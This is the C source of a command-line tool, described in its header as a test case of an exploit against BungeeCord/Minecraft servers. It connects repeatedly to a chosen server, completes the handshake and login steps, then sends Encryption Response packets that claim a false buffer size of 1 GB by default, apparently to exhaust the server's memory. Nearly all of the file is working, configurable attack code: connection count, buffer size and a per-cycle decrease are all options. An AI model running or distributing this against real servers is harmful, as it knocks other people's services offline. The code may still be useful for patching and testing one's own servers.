
/*
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    Copyright (C) 2016 Levi Webb
    
 */

/*
  Test case of an exploit in Bungee/Minecraft Servers. Proudly written in the One True Editor (emacs).
  
  Written by Jarcode (Levi Webb) -- Compile with GCC (no other flags needed). On Windows, you
  will need to use Cygwin, it reportedly works just fine.
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include <errno.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netdb.h>

#include <arpa/inet.h>

#include <unistd.h>

#include <getopt.h>

/* 1G buffer size */
#define DEFAULT_BUF_SIZE 1073741824

#define HELP_OPT_TAB 4
#define HELP_OPT_PARAGRAPH_INDENT 2

static const char* help_desc =
    "Usage: %s [OPTION]...\n"
    "Connects to a Minecraft server following 1.8+ protocol, sending packets\n"
    "with large buffer sizes (without sending valid data).\n";

static const char* help_opts =
    "-h, --help\1show this help\n"
    "-i, --address\1IPv4 address of the server to connect to (required)\n"
    "-s, --server\1hostname of the server to connect to (required)\n"
    "-p, --port\1port of the server to connect to (default: 25565)\n"
    "-c, --connection-amount\1amount of connections to make (default: 8)\n"
    "-b, --buf-size\1false buffer size to report to server in response packet\2"
    "(default: 1073741824)\n"
    "-v, --verbose\1dump packet data to stdout\n"
    "-d, --decrease\1decrease the buffer size by a certain amount every cycle\n"
    "-m, --minimum\1minimum buffer size, --decrease will not go below this value\n";

static const char* opt_str = "hs:p:c:s:i:vb:d:m:";

static struct option p_opts[] = {
    {"help", no_argument, 0, 'h'},
    {"address", required_argument, 0, 'i'},
    {"server", required_argument, 0, 's'},
    {"port", required_argument, 0, 'p'},
    {"connection-amount", required_argument, 0, 'c'},
    {"buf-size", required_argument, 0, 'b'},
    {"verbose", no_argument, 0, 'v'},
    {"decrease", required_argument, 0, 'd'},
    {"minimum", required_argument, 0, 'm'},
    {0, 0, 0, 0}
};

/* copied from some of my other code */
static size_t indent_opts_labelsize(void);
static size_t indent_opts_bufsize(size_t max_size);
static char* indent_opts(size_t total_size, size_t max_size, char* buf);

typedef size_t (*rw_stream) (void* udata, void* buf, size_t len);

static size_t vi32_read(uint32_t* ret, rw_stream read_stream, void* udata);
static size_t vi32_write(uint32_t value, rw_stream write_stream, void* udata);
static void stream_writebuf(void* buf, size_t len, rw_stream write_stream, void* udata);

static size_t syssock_write(void* udata, void* buf, size_t len);
static size_t syssock_read(void* udata, void* buf, size_t len);

static size_t sbuf_write(void* udata, void* buf, size_t len);

static size_t sbuf_read(void* udata, void* buf, size_t len);

/* safely execute an expression that contains pointer aliasing code */
#define safe_alias(op)                          \
        do {                                    \
            __sync_synchronize();               \
            op;                                 \
            __sync_synchronize();               \
        } while (false);                        \

int main(int argc, char** argv) {

    bool help_mode = false,
        illegal_argument_mode = false,
        verbose_mode = false;

    const char* arg_server = NULL,
        * arg_ip = NULL;
    int arg_port = 25565,
        arg_con_amt = 8,
        arg_buf_size = DEFAULT_BUF_SIZE,
        arg_decrease = 0,
        arg_minimum = 0;
    int c, idx = 0;
    while ((c = getopt_long(argc, argv, opt_str, p_opts, &idx)) != -1) {
        switch (c) {
        case 'v':
            verbose_mode = true;
            break;
        case 's':
            arg_server = optarg;
            break;
        case 'p':
            arg_port = atoi(optarg);
            if (arg_port <= 0) {
                printf("Port number must be a number larger than zero (%s).\n", optarg);
                exit(EXIT_FAILURE);
            }
            break;
        case 'i':
            arg_ip = optarg;
            break;
        case 'c':
            arg_con_amt = atoi(optarg);
            if (arg_con_amt <= 0) {
                printf("Connection amount must be a number larger than zero (%s).\n", optarg);
                exit(EXIT_FAILURE);
            }
            break;
        case 'b':
            arg_buf_size = atoi(optarg);
            if (arg_buf_size <= 0) {
                printf("Buffer size must be a number larger than zero (%s).\n", optarg);
                exit(EXIT_FAILURE);
            }
            break;
        case 'd':
            arg_decrease = atoi(optarg);
            if (arg_decrease <= 0) {
                printf("Decrease size must be a number larger than zero (%s).\n", optarg);
                exit(EXIT_FAILURE);
            }
            break;
        case 'm':
            arg_minimum = atoi(optarg);
            if (arg_minimum <= 0) {
                printf("Minimum size must be a number larger than zero (%s).\n", optarg);
                exit(EXIT_FAILURE);
            }
            break;
        case '?':
            exit(EXIT_FAILURE);
        case 'h':
        default:
            help_mode = true;
        }
    }

    if (arg_server == NULL && arg_ip == NULL) illegal_argument_mode = true;

    if (help_mode) {
        /* basic description */
        printf(help_desc, argv[0]);
        /* calculate the maximum 'label' size of the argument list */
        size_t max_size = indent_opts_labelsize();
        /* calculate the buffer size needed for the processed argument list */
        size_t total_size = indent_opts_bufsize(max_size);
        /* create stack buffer */
        char buf[total_size + 1];
        /* process argument list and copy into buffer */
        indent_opts(total_size, max_size, buf);
        /* display formatted argument list */
        fputs(buf, stdout);
        /* flush and exit */
        fflush(stdout);
        exit(EXIT_SUCCESS);
    }
    else if (illegal_argument_mode) {
        printf("Missing required argument '--server' or '--address'!"
               " Use '%s --help' for help.\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /* client -> server setup */
    
    int sockfd;
    struct sockaddr_in serv_addr;
    struct hostent* server;

    
    if (arg_ip == NULL && (server = gethostbyname(arg_server)) == NULL) {
        fprintf(stderr, "error: invalid host: '%s'\n", arg_ip ? arg_ip : arg_server);
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, 0, sizeof(struct sockaddr_in));
    serv_addr.sin_family = AF_INET;

    if (arg_ip != NULL) {
        if (!inet_aton(arg_ip, &serv_addr.sin_addr)) {
            fprintf(stderr, "error: bad IPv4 address: '%s'\n", arg_ip);
            exit(EXIT_FAILURE);
        }
    }
    else {
        bcopy(*server->h_addr_list, (char*) &serv_addr.sin_addr.s_addr, server->h_length);
    }

    serv_addr.sin_port = htons(arg_port);

    if (verbose_mode) {
        printf("Packet format: {varint_32: len, uint8_t[len]: data}. Data is shown below.\n\n");
        printf("The first byte(s) in each packet are the packet IDs.\n\n");
    }
    
    size_t n;
    for (n = 0; n < arg_con_amt; ++n) {
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            fprintf(stderr, "error opening socket: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }
        if (connect(sockfd, (struct sockaddr*) &serv_addr, sizeof(struct sockaddr_in)) < 0) {
            fprintf(stderr, "error connecting: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }

        /* actual exploit here */

        /* some macros to deal with boilerplate args */
#define nwrite syssock_write, &sockfd
#define nread syssock_read, &sockfd
#define bwrite sbuf_write, buf + idx
#define bread sbuf_read, buf + idx
        
#define packet_write()                          \
        do {                                    \
            vi32_write(fake_idx ? fake_idx : idx, nwrite);  \
            stream_writebuf(buf, idx, nwrite);  \
            idx = 0;                            \
            fake_idx = 0;                       \
        } while (false)

#define packet_dump(desc)                                               \
        do {                                                            \
            size_t t;                                                   \
            if (!fake_idx) {                                            \
                printf(desc " data (len: %d, cycle: %d): \n",           \
                       (int) idx, (int) n);                             \
            }                                                           \
            else {                                                      \
                printf(desc " data (fake len: %d, len: %d, cycle: %d): \n", \
                       (int) fake_idx, (int) idx, (int) n);             \
            }                                                           \
            for (t = 0; t < idx; ++t) {                                 \
                if (buf[t] >= 0x20 && buf[t] <= 0x7E)                   \
                    printf(t == idx - 1 ? "%02X(%c)" : "%02X(%c):",     \
                           buf[t], (char) buf[t]);                      \
                else                                                    \
                    printf(t == idx - 1 ? "%02X" : "%02X:", buf[t]);    \
            }                                                           \
            puts("\n");                                                 \
        } while (false)

#define write_and_dump(desc)                        \
        do {                                    \
            if (verbose_mode)                   \
                packet_dump(desc);                  \
            packet_write();                     \
        } while (false)

        if (verbose_mode) {
            printf("sending %d size buffer exploit\n\n", arg_buf_size);
        }

        /* buffer, our packets aren't ever over 4K */
        uint8_t buf[4096];
        size_t idx = 0;
        size_t fake_idx = 0;

        /* Handshake packet */
        idx += vi32_write(0x0, bwrite); /* id */
        idx += vi32_write(107, bwrite); /* version (107 for 1.9) */
        /* copy hostname string */
        const char* host_str = arg_ip ? arg_ip : arg_server;
        size_t hostlen = strlen(host_str);
        idx += vi32_write(hostlen, bwrite);
        memcpy(buf + idx, host_str, hostlen);
        idx += hostlen;
        safe_alias(*(uint16_t*) (buf + idx) = (uint16_t) arg_port); /* port */
        idx += 2;
        idx += vi32_write(2, bwrite); /* 2 for login state */
        
        /* Write handshake packet */
        write_and_dump("handshake");

        /* we should be in login state now, send 'Login Start' packet */
        idx += vi32_write(0x0, bwrite); /* id */
        /* A string for the Player's name. Doesn't have to be valid. */
        /* Bungee will display this in its log. */
        const char* foo = "overflow exploit test";
        size_t foolen = strlen(foo);
        idx += vi32_write(foolen, bwrite);
        memcpy(buf + idx, foo, foolen);
        idx += foolen;

        /* Write Login Start packet */
        write_and_dump("login start");

        /* Write Encryption Response packet */
        idx += vi32_write(0x1, bwrite); /* id */
        idx += vi32_write((uint32_t) arg_buf_size, bwrite); /* bad buffer size */
        idx += 8; /* send some bytes so it starts to read into the buffer */
        
        /* just ignore writing the rest of the data */

        write_and_dump("encryption response");
        

        /* undefine scope-dependent macros */
#undef nwrite
#undef nread
#undef bwrite
#undef bread
#undef packet_write

        /* decrease the buffer size */
        if (arg_buf_size - arg_decrease > arg_minimum) {
            arg_buf_size -= arg_decrease;
        }

        close(sockfd);
    }

    printf("Sent %d packets of size %d.\n", arg_con_amt, arg_buf_size);
    
    return EXIT_SUCCESS;
}

/* stream function implementations */

static size_t sbuf_write(void* udata, void* buf, size_t len) {
    memcpy(udata, buf, len);
    return len;
}

static size_t sbuf_read(void* udata, void* buf, size_t len) {
    memcpy(buf, udata, len);
    return len;
}

static size_t syssock_write(void* udata, void* buf, size_t len) {
    return write(*(int*) udata, buf, len);
}

static size_t syssock_read(void* udata, void* buf, size_t len) {
    return read(*(int*) udata, buf, len);
}

/* varint read/write */

static size_t vi32_read(uint32_t* ret, rw_stream read_stream, void* udata) {
	uint32_t value = 0;
	uint8_t shift = 0;
	uint8_t b = 0;
    size_t bytes = 0;
	do {
        if (!read_stream(udata, &b, 1)) {
            return 0;
        }
        bytes++;
		value = value | (((uint32_t) (b & 0x7f)) << shift);
		shift += 7;
	} while ((b & 0x80) != 0);
	*ret = value;
    return bytes;
}

static size_t vi32_write(uint32_t value, rw_stream write_stream, void* udata) {
	unsigned char b[5];
	size_t idx = 0;
	do {
		b[idx] = (value & 0x7f) | ((value > 0x7f) ? 0x80 : 0x00);
		value = value >> 7;
		idx++;
	} while (value > 0);

    size_t written = 0;
    do {
        size_t ret = write_stream(udata, b + written, idx - written);
        if (!ret) break;
        written += ret;
    } while (written < idx);
    return idx;
}

static void stream_writebuf(void* buf, size_t len, rw_stream write_stream, void* udata) {
    size_t written = 0;
    do {
        size_t ret = write_stream(udata, buf + written, len - written);
        if (!ret) break;
        written += ret;
    } while (written < len);
}


static size_t indent_opts_labelsize(void) {
    // first pass, we determine the maximum label size
    size_t max_size = 0, current_size = 0, t;
    // 'false' for reading label, 'true' for desc
    bool mode = false;
    for (t = 0; help_opts[t] != '\0'; t++) {
        switch (help_opts[t]) {
        case '\1':
            if (current_size > max_size) {
                max_size = current_size;
            }
            mode = true;
            current_size = 0;
            break;
        case '\n':
            mode = false;
            break;
        default:
            if (!mode) {
                ++current_size;
            }
        }
    }
    return max_size;
}
static size_t indent_opts_bufsize(size_t max_size) {
    size_t current_size = 0, total_size = 0, t;
    bool mode = false;
    for (t = 0; help_opts[t] != '\0'; t++) {
        switch (help_opts[t]) {
        case '\1':
            total_size += (max_size - current_size) + HELP_OPT_TAB; // tabulation
            current_size = 0;
            mode = true;
            break;
        case '\2':
            /* next-line tab, one more for newline */
            total_size += max_size + HELP_OPT_TAB + HELP_OPT_PARAGRAPH_INDENT + 1;
            break;
        case '\n':
            mode = false;
            ++total_size;
            break;
        default:
            if (!mode) {
                ++current_size;
            }
            ++total_size;
        }
    }
    return total_size;
}

static char* indent_opts(size_t total_size, size_t max_size, char* buf) {
    buf[total_size] = '\0';
    size_t current_size = 0, idx = 0, gap, t;
    bool mode = false;
    for (t = 0; help_opts[t] != '\0'; t++) {
        switch (help_opts[t]) {
        case '\1':
            gap = (max_size - current_size) + HELP_OPT_TAB;
            assert(gap < max_size + HELP_OPT_TAB);
            memset(&buf[idx], ' ', gap);
            current_size = 0;
            idx += gap;
            mode = true;
            break;
        case '\2':
            gap = max_size + HELP_OPT_TAB + HELP_OPT_PARAGRAPH_INDENT;
            buf[idx] = '\n';
            ++idx;
            memset(&buf[idx], ' ', gap);
            idx += gap;
            break;
        case '\n':
            mode = false;
            buf[idx] = '\n';
            idx++;
            break;
        default:
            if (!mode) {
                ++current_size;
            }
            buf[idx] = help_opts[t];
            idx++;
        }
    }
    return buf;
}
